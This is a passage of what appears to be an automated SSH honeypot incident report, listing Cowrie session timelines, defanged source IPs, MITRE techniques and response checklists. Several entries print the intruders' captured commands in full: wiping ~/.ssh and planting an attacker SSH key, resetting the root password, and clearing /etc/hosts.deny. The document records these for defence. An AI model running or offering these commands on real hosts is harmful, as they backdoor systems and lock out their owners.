| `2026-04-13 06:17:01` | `cowrie.login.success` |
| `2026-04-13 06:17:02` | `cowrie.session.params` |
| `2026-04-13 06:17:02` | `cowrie.command.input` |
| `2026-04-13 06:17:02` | `cowrie.command.failed` |
| `2026-04-13 06:17:02` | `cowrie.log.closed` |
| `2026-04-13 06:17:03` | `cowrie.session.params` |
| `2026-04-13 06:17:03` | `cowrie.command.input` |
| `2026-04-13 06:17:03` | `cowrie.session.file_download` |
| `2026-04-13 06:17:03` | `cowrie.log.closed` |
| `2026-04-13 06:17:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ee1b5183c73

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:17 |
| **Last Seen** | 2026-04-13 06:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:17:02` | `cowrie.session.connect` |
| `2026-04-13 06:17:02` | `cowrie.client.version` |
| `2026-04-13 06:17:03` | `cowrie.client.kex` |
| `2026-04-13 06:17:04` | `cowrie.login.success` |
| `2026-04-13 06:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f2b496f01c8

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:17 |
| **Last Seen** | 2026-04-13 06:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:17:07` | `cowrie.session.connect` |
| `2026-04-13 06:17:07` | `cowrie.client.version` |
| `2026-04-13 06:17:07` | `cowrie.client.kex` |
| `2026-04-13 06:17:08` | `cowrie.login.success` |
| `2026-04-13 06:17:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6bf59ffa28e

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:17 |
| **Last Seen** | 2026-04-13 06:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:17:32` | `cowrie.session.connect` |
| `2026-04-13 06:17:32` | `cowrie.client.version` |
| `2026-04-13 06:17:32` | `cowrie.client.kex` |
| `2026-04-13 06:17:32` | `cowrie.login.success` |
| `2026-04-13 06:17:33` | `cowrie.session.params` |
| `2026-04-13 06:17:33` | `cowrie.command.input` |
| `2026-04-13 06:17:33` | `cowrie.command.failed` |
| `2026-04-13 06:17:33` | `cowrie.log.closed` |
| `2026-04-13 06:17:33` | `cowrie.session.params` |
| `2026-04-13 06:17:33` | `cowrie.command.input` |
| `2026-04-13 06:17:33` | `cowrie.session.file_download` |
| `2026-04-13 06:17:33` | `cowrie.log.closed` |
| `2026-04-13 06:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a2e96a4067b

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:17 |
| **Last Seen** | 2026-04-13 06:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:17:34` | `cowrie.session.connect` |
| `2026-04-13 06:17:34` | `cowrie.client.version` |
| `2026-04-13 06:17:34` | `cowrie.client.kex` |
| `2026-04-13 06:17:34` | `cowrie.login.success` |
| `2026-04-13 06:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9e6be56a6e5

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:18 |
| **Last Seen** | 2026-04-13 06:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:18:49` | `cowrie.session.connect` |
| `2026-04-13 06:18:49` | `cowrie.client.version` |
| `2026-04-13 06:18:49` | `cowrie.client.kex` |
| `2026-04-13 06:18:50` | `cowrie.login.success` |
| `2026-04-13 06:18:51` | `cowrie.session.params` |
| `2026-04-13 06:18:51` | `cowrie.command.input` |
| `2026-04-13 06:18:51` | `cowrie.command.failed` |
| `2026-04-13 06:18:51` | `cowrie.log.closed` |
| `2026-04-13 06:18:52` | `cowrie.session.params` |
| `2026-04-13 06:18:52` | `cowrie.command.input` |
| `2026-04-13 06:18:52` | `cowrie.session.file_download` |
| `2026-04-13 06:18:52` | `cowrie.log.closed` |
| `2026-04-13 06:18:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f5d1e4b7e92

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:18 |
| **Last Seen** | 2026-04-13 06:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:18:56` | `cowrie.session.connect` |
| `2026-04-13 06:18:56` | `cowrie.client.version` |
| `2026-04-13 06:18:56` | `cowrie.client.kex` |
| `2026-04-13 06:18:57` | `cowrie.login.success` |
| `2026-04-13 06:18:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1bfd6e90792

| Field | Detail |
|---|---|
| **Source IP** | `14.103.46[.]177` |
| **First Seen** | 2026-04-13 06:19 |
| **Last Seen** | 2026-04-13 06:19 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:IGrKHStjg94E"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:19:09` | `cowrie.session.connect` |
| `2026-04-13 06:19:09` | `cowrie.client.version` |
| `2026-04-13 06:19:09` | `cowrie.client.kex` |
| `2026-04-13 06:19:10` | `cowrie.login.success` |
| `2026-04-13 06:19:11` | `cowrie.session.params` |
| `2026-04-13 06:19:11` | `cowrie.command.input` |
| `2026-04-13 06:19:11` | `cowrie.command.failed` |
| `2026-04-13 06:19:11` | `cowrie.log.closed` |
| `2026-04-13 06:19:12` | `cowrie.session.params` |
| `2026-04-13 06:19:12` | `cowrie.command.input` |
| `2026-04-13 06:19:12` | `cowrie.session.file_download` |
| `2026-04-13 06:19:12` | `cowrie.log.closed` |
| `2026-04-13 06:19:24` | `cowrie.session.params` |
| `2026-04-13 06:19:24` | `cowrie.command.input` |
| `2026-04-13 06:19:24` | `cowrie.log.closed` |
| `2026-04-13 06:19:24` | `cowrie.session.params` |
| `2026-04-13 06:19:24` | `cowrie.command.input` |
| `2026-04-13 06:19:25` | `cowrie.log.closed` |
| `2026-04-13 06:19:25` | `cowrie.session.params` |
| `2026-04-13 06:19:25` | `cowrie.command.input` |
| `2026-04-13 06:19:25` | `cowrie.session.file_download` |
| `2026-04-13 06:19:25` | `cowrie.log.closed` |
| `2026-04-13 06:19:25` | `cowrie.session.params` |
| `2026-04-13 06:19:25` | `cowrie.command.input` |
| `2026-04-13 06:19:25` | `cowrie.log.closed` |
| `2026-04-13 06:19:26` | `cowrie.session.params` |
| `2026-04-13 06:19:26` | `cowrie.command.input` |
| `2026-04-13 06:19:26` | `cowrie.log.closed` |
| `2026-04-13 06:19:26` | `cowrie.session.params` |
| `2026-04-13 06:19:26` | `cowrie.command.input` |
| `2026-04-13 06:19:26` | `cowrie.command.input` |
| `2026-04-13 06:19:26` | `cowrie.log.closed` |
| `2026-04-13 06:19:27` | `cowrie.session.params` |
| `2026-04-13 06:19:27` | `cowrie.command.input` |
| `2026-04-13 06:19:27` | `cowrie.log.closed` |
| `2026-04-13 06:19:27` | `cowrie.session.params` |
| `2026-04-13 06:19:27` | `cowrie.command.input` |
| `2026-04-13 06:19:27` | `cowrie.log.closed` |
| `2026-04-13 06:19:28` | `cowrie.session.params` |
| `2026-04-13 06:19:28` | `cowrie.command.input` |
| `2026-04-13 06:19:28` | `cowrie.log.closed` |
| `2026-04-13 06:19:28` | `cowrie.session.params` |
| `2026-04-13 06:19:28` | `cowrie.command.input` |
| `2026-04-13 06:19:28` | `cowrie.log.closed` |
| `2026-04-13 06:19:28` | `cowrie.session.params` |
| `2026-04-13 06:19:28` | `cowrie.command.input` |
| `2026-04-13 06:19:29` | `cowrie.log.closed` |
| `2026-04-13 06:19:29` | `cowrie.session.params` |
| `2026-04-13 06:19:29` | `cowrie.command.input` |
| `2026-04-13 06:19:29` | `cowrie.log.closed` |
| `2026-04-13 06:19:29` | `cowrie.session.params` |
| `2026-04-13 06:19:29` | `cowrie.command.input` |
| `2026-04-13 06:19:30` | `cowrie.log.closed` |
| `2026-04-13 06:19:30` | `cowrie.session.params` |
| `2026-04-13 06:19:30` | `cowrie.command.input` |
| `2026-04-13 06:19:30` | `cowrie.log.closed` |
| `2026-04-13 06:19:30` | `cowrie.session.params` |
| `2026-04-13 06:19:30` | `cowrie.command.input` |
| `2026-04-13 06:19:31` | `cowrie.log.closed` |
| `2026-04-13 06:19:31` | `cowrie.session.params` |
| `2026-04-13 06:19:31` | `cowrie.command.input` |
| `2026-04-13 06:19:31` | `cowrie.log.closed` |
| `2026-04-13 06:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.46[.]177` to AbuseIPDB if not already reported
- [ ] Block `14.103.46[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bb448e739c2

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]91` |
| **First Seen** | 2026-04-13 06:20 |
| **Last Seen** | 2026-04-13 06:20 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:HngSQblcWOta"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:20:19` | `cowrie.session.connect` |
| `2026-04-13 06:20:19` | `cowrie.client.version` |
| `2026-04-13 06:20:21` | `cowrie.client.kex` |
| `2026-04-13 06:20:21` | `cowrie.login.success` |
| `2026-04-13 06:20:22` | `cowrie.session.params` |
| `2026-04-13 06:20:22` | `cowrie.command.input` |
| `2026-04-13 06:20:22` | `cowrie.command.failed` |
| `2026-04-13 06:20:22` | `cowrie.log.closed` |
| `2026-04-13 06:20:22` | `cowrie.session.params` |
| `2026-04-13 06:20:22` | `cowrie.command.input` |
| `2026-04-13 06:20:22` | `cowrie.session.file_download` |
| `2026-04-13 06:20:22` | `cowrie.log.closed` |
| `2026-04-13 06:20:35` | `cowrie.session.params` |
| `2026-04-13 06:20:35` | `cowrie.command.input` |
| `2026-04-13 06:20:35` | `cowrie.log.closed` |
| `2026-04-13 06:20:35` | `cowrie.session.params` |
| `2026-04-13 06:20:35` | `cowrie.command.input` |
| `2026-04-13 06:20:35` | `cowrie.log.closed` |
| `2026-04-13 06:20:36` | `cowrie.session.params` |
| `2026-04-13 06:20:36` | `cowrie.command.input` |
| `2026-04-13 06:20:36` | `cowrie.session.file_download` |
| `2026-04-13 06:20:36` | `cowrie.log.closed` |
| `2026-04-13 06:20:36` | `cowrie.session.params` |
| `2026-04-13 06:20:36` | `cowrie.command.input` |
| `2026-04-13 06:20:36` | `cowrie.log.closed` |
| `2026-04-13 06:20:38` | `cowrie.session.params` |
| `2026-04-13 06:20:38` | `cowrie.command.input` |
| `2026-04-13 06:20:38` | `cowrie.log.closed` |
| `2026-04-13 06:20:38` | `cowrie.session.params` |
| `2026-04-13 06:20:38` | `cowrie.command.input` |
| `2026-04-13 06:20:38` | `cowrie.command.input` |
| `2026-04-13 06:20:38` | `cowrie.log.closed` |
| `2026-04-13 06:20:39` | `cowrie.session.params` |
| `2026-04-13 06:20:39` | `cowrie.command.input` |
| `2026-04-13 06:20:39` | `cowrie.log.closed` |
| `2026-04-13 06:20:39` | `cowrie.session.params` |
| `2026-04-13 06:20:39` | `cowrie.command.input` |
| `2026-04-13 06:20:40` | `cowrie.log.closed` |
| `2026-04-13 06:20:40` | `cowrie.session.params` |
| `2026-04-13 06:20:40` | `cowrie.command.input` |
| `2026-04-13 06:20:40` | `cowrie.log.closed` |
| `2026-04-13 06:20:40` | `cowrie.session.params` |
| `2026-04-13 06:20:40` | `cowrie.command.input` |
| `2026-04-13 06:20:40` | `cowrie.log.closed` |
| `2026-04-13 06:20:41` | `cowrie.session.params` |
| `2026-04-13 06:20:41` | `cowrie.command.input` |
| `2026-04-13 06:20:47` | `cowrie.log.closed` |
| `2026-04-13 06:20:47` | `cowrie.session.params` |
| `2026-04-13 06:20:47` | `cowrie.command.input` |
| `2026-04-13 06:20:47` | `cowrie.log.closed` |
| `2026-04-13 06:20:47` | `cowrie.session.params` |
| `2026-04-13 06:20:47` | `cowrie.command.input` |
| `2026-04-13 06:20:48` | `cowrie.log.closed` |
| `2026-04-13 06:20:48` | `cowrie.session.params` |
| `2026-04-13 06:20:48` | `cowrie.command.input` |
| `2026-04-13 06:20:48` | `cowrie.log.closed` |
| `2026-04-13 06:20:48` | `cowrie.session.params` |
| `2026-04-13 06:20:48` | `cowrie.command.input` |
| `2026-04-13 06:20:49` | `cowrie.log.closed` |
| `2026-04-13 06:20:49` | `cowrie.session.params` |
| `2026-04-13 06:20:49` | `cowrie.command.input` |
| `2026-04-13 06:20:49` | `cowrie.log.closed` |
| `2026-04-13 06:20:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]91` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01cefeb842f7

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:20 |
| **Last Seen** | 2026-04-13 06:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:20:44` | `cowrie.session.connect` |
| `2026-04-13 06:20:44` | `cowrie.client.version` |
| `2026-04-13 06:20:44` | `cowrie.client.kex` |
| `2026-04-13 06:20:46` | `cowrie.login.success` |
| `2026-04-13 06:20:46` | `cowrie.session.params` |
| `2026-04-13 06:20:46` | `cowrie.command.input` |
| `2026-04-13 06:20:46` | `cowrie.command.failed` |
| `2026-04-13 06:20:47` | `cowrie.log.closed` |
| `2026-04-13 06:20:48` | `cowrie.session.params` |
| `2026-04-13 06:20:48` | `cowrie.command.input` |
| `2026-04-13 06:20:48` | `cowrie.session.file_download` |
| `2026-04-13 06:20:48` | `cowrie.log.closed` |
| `2026-04-13 06:20:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3436663bfc2

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:20 |
| **Last Seen** | 2026-04-13 06:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:20:51` | `cowrie.session.connect` |
| `2026-04-13 06:20:51` | `cowrie.client.version` |
| `2026-04-13 06:20:52` | `cowrie.client.kex` |
| `2026-04-13 06:20:53` | `cowrie.login.success` |
| `2026-04-13 06:20:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e404f7a5ad1

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:22 |
| **Last Seen** | 2026-04-13 06:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:22:40` | `cowrie.session.connect` |
| `2026-04-13 06:22:40` | `cowrie.client.version` |
| `2026-04-13 06:22:40` | `cowrie.client.kex` |
| `2026-04-13 06:22:42` | `cowrie.login.success` |
| `2026-04-13 06:22:42` | `cowrie.session.params` |
| `2026-04-13 06:22:42` | `cowrie.command.input` |
| `2026-04-13 06:22:42` | `cowrie.command.failed` |
| `2026-04-13 06:22:43` | `cowrie.log.closed` |
| `2026-04-13 06:22:43` | `cowrie.session.params` |
| `2026-04-13 06:22:43` | `cowrie.command.input` |
| `2026-04-13 06:22:44` | `cowrie.session.file_download` |
| `2026-04-13 06:22:44` | `cowrie.log.closed` |
| `2026-04-13 06:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92d1af25e18b

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:22 |
| **Last Seen** | 2026-04-13 06:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:22:43` | `cowrie.session.connect` |
| `2026-04-13 06:22:43` | `cowrie.client.version` |
| `2026-04-13 06:22:44` | `cowrie.client.kex` |
| `2026-04-13 06:22:44` | `cowrie.login.success` |
| `2026-04-13 06:22:44` | `cowrie.session.params` |
| `2026-04-13 06:22:44` | `cowrie.command.input` |
| `2026-04-13 06:22:44` | `cowrie.command.failed` |
| `2026-04-13 06:22:44` | `cowrie.log.closed` |
| `2026-04-13 06:22:45` | `cowrie.session.params` |
